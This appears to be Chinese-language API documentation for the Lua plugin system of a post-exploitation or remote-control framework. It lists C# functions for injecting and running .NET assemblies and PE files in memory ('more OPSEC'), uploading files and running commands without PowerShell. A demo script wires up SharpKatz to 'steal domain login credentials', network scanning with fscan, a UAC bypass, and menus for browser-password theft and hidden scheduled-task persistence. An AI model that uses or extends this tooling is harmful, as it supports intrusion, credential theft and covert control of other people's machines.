





- [演示](#演示)
- [函数原型](#函数原型)
  - [AddCommand](#addcommand)
  - [AddMenuItemA](#addmenuitema)
  - [AddMenuItemB](#addmenuitemb)
  - [AttackMenuExpand](#attackmenuexpand)
  - [AddTextBox](#addtextbox)
  - [AddSelectFileButton](#addselectfilebutton)
  - [Addlabel](#addlabel)
  - [AddTextBox](#addtextbox-1)
  - [AddComBox](#addcombox)
  - [AddButton](#addbutton)
  - [AddMenuItemsAsSubItems](#addmenuitemsassubitems)
  - [CreateForm](#createform)
  - [ExecuteAssembly](#executeassembly)
  - [Inlineassembly](#inlineassembly)
  - [GetFileName](#getfilename)
  - [MessageboxA](#messageboxa)
  - [MenuStripExpand](#menustripexpand)
  - [Nopowershell](#nopowershell)
  - [Upload](#upload)
  - [PEloader](#peloader)
  - [Sessionlog](#sessionlog)
- [lua  Demo](#lua--demo)


# 演示

# 函数原型

## AddCommand

```C#
public static void AddCommand(
    string lpName, 
    string filePath, 
    string loadType, 
    string description,
    string usage
)
```

## AddMenuItemA

```C#
 public void AddMenuItemA(
     string menuName, 
     string iconPath
 )
```



## AddMenuItemB

```C#
public void AddMenuItemB(
    string menuName, 
    string iconPath, 
    NLua.LuaFunction clickEvent
)
```



## AttackMenuExpand 

```C#
  public void AttackMenuExpand(
      string menuName,
      string iconPath, 
      NLua.LuaFunction clickEvent  
  )
```





## AddTextBox

```C#
TextBox AddTextBox(
    Form form,
    int x,
    int y, 
    int width, 
    int height
)
```



## AddSelectFileButton

```C#
 public Button AddSelectFileButton(
     Form form,
     string text,
     int x, 
     int y, 
     int width,
     int height
 )
```

## Addlabel

```C#
public Label Addlabel(
    Form form, 
    string title, 
    int x, 
    int y, 
    int width, 
    int height
)
```

## AddTextBox

```C#
public TextBox AddTextBox(
    Form form, 
    int x, 
    int y, 
    int width, 
    int height
)
```

## AddComBox

```C#
public ComboBox AddComBox(
    Form form,
    int x, 
    int y,
    int width,
    int height
)
    
    
```



## AddButton

```C#
 public void AddButton(
     Form form, 
     string text, 
     int x, 
     int y, 
     int width,
     int height, 
     NLua.LuaFunction clickEvent
 )

```



## AddMenuItemsAsSubItems

```C#
 public void AddMenuItemsAsSubItems(
     string parentItemName, 
     LuaTable subItemsTable
 )
```





## Assemblyloadbase64

```C#
 public void Assemblyloadbase64(string base64stub)
```

注意：该函数在C#中注册，功能为加载.net exe文件，在lua中调用时，您需要将.net 程序集转为base64编码

powershell一句话转为base64编码，您只需要修改.net exe的路径

```powershell
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Lenovo\Desktop\Client2.exe")) | Out-File "a.txt"
```



## CreateForm

```C#
 public Form CreateForm(
     string title,
     int width,
     int height
 )
```

创建一个窗体

## ExecuteAssembly

```C#
public static void ExecuteAssembly(
    string filePath, 
    string args
)
```

创建一个子进程，将.net程序集通过注入的方式在该子进程中加载，并将结果通过管道的形式传回服务端

## Inlineassembly

```C#
 public static void Inlineassembly(
     string filePath, 
     string args
 )
```

以内联的方式加载.net 程序集，更加OPSEC，但是同时也增大了程序的内存风险

## GetFileName

```C#
public string GetFileName(string filePath)
```

获取路径中的文件名

## MessageboxA

```C#
public void MessageboxA(string conText)
```



## MenuStripExpand

```C#
public void MenuStripExpand(  
    string menuName,
    string iconPath,
    NLua.LuaFunction clickEvent   //Click Event
)
```

顶部菜单栏扩展

## Nopowershell

```C#
public static void Nopowershell(
    string command, 
    string outString
)
```



## Upload

```C#
public static void Upload(
    string uploadFilePath, 
    string filePath
)
```



## PEloader

```C#
public static void PEloader(
    string filePath, 
    string args
)
```

## Sessionlog

```C#
public void Sessionlog(string conText)
```

# lua  示例

lua Plugins demo

外部工具下载链接 :[SharpKatz](https://github.com/b4rtik/SharpKatz)、[fscan](https://github.com/shadow1ng/fscan)

```lua
local function SchTaskForm()
    local IsOK = false
    local Form1 = CreateForm("sch", 422, 355)

    local Label1 = Addlabel(Form1, "Interval(min):", 17, 33, 133, 25)
    local Label2 = Addlabel(Form1, "Select File:", 31, 103, 114, 25)
    local Label3 = Addlabel(Form1, "Directory:", 28, 174, 114, 25)

    local addButton = AddSelectFileButton(Form1, "Select", 162, 100, 181, 33)
    local texBox1 = AddTextBox(Form1, 162, 31, 181, 33)
    local ComBox1 = AddComBox(Form1, 162, 174, 181, 33)
    local Button1 = AddButton(Form1, "Ok", 36, 234, 106, 37, function()
        if texBox1.Text ~= "" and ComBox1.Text ~= "" and addButton.Text ~=
            "Select" then -- The values of texBox1 and ComBox1 can't be empty strings, otherwise this window
            IsOK = true
            Form1:Hide()

        else
            IsOK = false
            MessageBoxA("Empty input detected")
        end
    end)

    local Button2 = AddButton(Form1, "close", 236, 234, 107, 37,
                              function() Form1:Close() end)
    Form1:ShowDialog()
    if IsOK then
        local FileName = GetFileName(addButton.Text)
        local UploadFilePath = ComBox1.Text .. "\\" .. FileName
        Upload(UploadFilePath, addButton.Text)
        -- InlineAssembly("Plugins\\BypassUAC-ETV.exe", "Plugins\\BypassUAC-ETV.exe", texBox1.Text)
    end
end


AddCommand(
    "SharpKatz",
    "Plugins\\SharpKatz.exe", --FilePath
    "execute-assembly",
    "Steal domain login credentials",
    "SharpKatz -h"
)
AddCommand(
    "fscan",
    "Plugins\\fscan.bin",
    "RunPE",
    "asdasd",
    "DDDDD"
)
AttackMenuExpand("asdasd","",null)
MenuStripExpand("asdasd",null,null)


local function Privileg()
    InlineAssembly("Plugins\\BypassUAC-ETV.exe", "calc")
end

local function RunPEload()
    RunPE("Plugins\\fscan.bin","-h 192.168.1.1/24")
    -- 调用C#中注册的printf方法
    Sessionlog("Message")
end

local function AddMenuItem()

    AddMenuItemA("渗透插件", null)
    AddMenuItemA("信息收集", null)
    AddMenuItemA("抓取浏览器密码", null)
    AddMenuItemA("持久化控制", null)
    AddMenuItemA("任务计划", null)
    AddMenuItemB("隐藏安装", "", SchTaskForm)
    AddMenuItemB("权限提升",null,function ()
        Sessionlog("Message")
    end)
    AddMenuItemB("4.0","",RunPEload)
    local menuStructure = {
        ["渗透插件"] = {"信息收集", "持久化控制","权限提升"},
        ["信息收集"] = {"抓取浏览器密码"},
        ["持久化控制"] = {"任务计划"},
        ["任务计划"] = {"隐藏安装"},
        ["权限提升"] = {"4.0"}
    }
    for parent, subs in pairs(menuStructure) do
        AddMenuItemsAsSubItems(parent, subs)
    end
end

AddMenuItem()

```





